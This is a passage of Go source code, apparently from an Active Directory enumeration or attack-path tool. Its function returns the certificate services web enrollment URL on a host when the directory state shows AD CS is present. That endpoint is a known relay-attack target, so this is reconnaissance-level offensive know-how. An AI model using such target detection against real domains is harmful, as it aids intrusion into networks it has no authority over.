	return ""
}

func detectADCSWebEnrollment(state *core.ADState, hostIP string) string {
	if len(state.ADCS) > 0 {
		return "http://" + hostIP + "/certsrv/certfnsh.asp"
	}
	return ""
}
